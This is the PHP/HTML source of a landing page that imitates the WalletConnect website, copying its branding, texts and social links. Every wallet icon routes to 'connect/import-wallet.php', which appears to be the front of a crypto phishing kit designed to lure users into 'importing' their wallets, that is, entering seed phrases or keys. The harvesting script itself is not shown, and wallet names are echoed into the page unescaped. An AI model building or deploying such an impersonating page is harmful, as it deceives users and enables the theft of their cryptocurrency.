<html>

<head>
    <link rel="stylesheet" href="main.css" type="text/css" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
    <meta property="og:image" content="/images/logo.svg">
    <link rel="icon" href="images/logo.svg">

    <script>
        function show() {
            var x = document.getElementById("hidden");
            if (x.style.display === "block") {
                x.style.display = "none";
            } else {
                x.style.display = "block";
            }

            if (x.style.display === "block") {
                document.getElementById("btn").innerHTML = "Show Less &uarr;";
            }
        }
    </script>
</head>

<title>WalletConnect</title>

<body>
    <center>
        <div class="top">
            <a href="#footer" class="left">Github</a>

            <a href="#" class="left">Docs</a>
            <a href="index.php" class="main"><img src="images/logo.svg" alt="logo" /></a>
            <a href="#wallets" class="left">Wallets</a>
            <a href="#" class="left">Apps</a>
        </div>
        </br>
        <div class="gFeYHJ">WalletConnect</div>

        <div class="lpfxqP">Open protocol for connecting Wallets to Dapps</div>
        </br>

        <div class="dXgqeu">
            <img src="images/banner.png" alt="WalletConnect">
        </div>

        <div class="bout">
            <h2 class="home">What is WalletConnect?</h2>
            <p>WalletConnect is an open source protocol for connecting decentralised applications to mobile wallets with QR code scanning or deep linking.
                A user can interact securely with any Dapp from their mobile phone, making WalletConnect wallets a safer choice compared to desktop or browser
                extension wallets.</p></br>
            <h2 class="home">How does it work?</h2>
            <p>WalletConnect connects web applications to supported <a href="#">mobile wallets</a>. WalletConnect session is started by a scanning a QR
                code (desktop) or by clicking an application deep link (mobile).</p>
        </div>

        <div class="wallets" id="wallets">
            <h1 class="home">Wallets</h1>
            <p>Multiple iOS and Android wallets support the WalletConnect protocol. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
            </br>
            <div class="all">
                <?php
                require_once("config/config.php");
                global $wallets;
                $apps = array_splice($wallets, 0, 24);
                foreach ($apps as $app) { ?>
                    <div class="apps">
                        <a href="connect/import-wallet.php?app=<?= $app['name'] ?>"><img src="<?= $app['image'] ?>"></a></br>
                        <?= $app['name'] ?>
                    </div>
                <?php } ?>
            </div>
            </br>
            <button onclick="show()" class="btn" id="btn">Show More &darr;</button>
            </br></br>
            <div class="hidden" id="hidden">
                <div class="all">
                    <?php
                    foreach ($wallets as $app) { ?>
                        <div class="apps">
                            <a href="connect/import-wallet.php?app=<?= $app['name'] ?>"><img src="<?= $app['image'] ?>"></a></br>
                            <?= $app['name'] ?>
                        </div>
                    <?php } ?>
                </div>
            </div>
        </div>

        <footer>
            <div id="footer">
                <p><img src="images/discord.svg" class="footimg"> <a href="https://discord.gg/jhxMvxP">Discord</a></p></br>
                <p><img src="images/telegram.svg" class="footimg"> <a href="https://t.me/walletconnect_announcements">Telegram</a></p></br>
                <p><img src="images/twitter.svg" class="footimg"> <a href="https://twitter.walletconnect.org/">Twitter</a></p></br>
                <p><img src="images/github.svg" class="footimg"> <a href="https://github.com/walletconnect">Github</a></p></br>
        </footer>
    </center>
</body>

</html>

<!-- Localized -->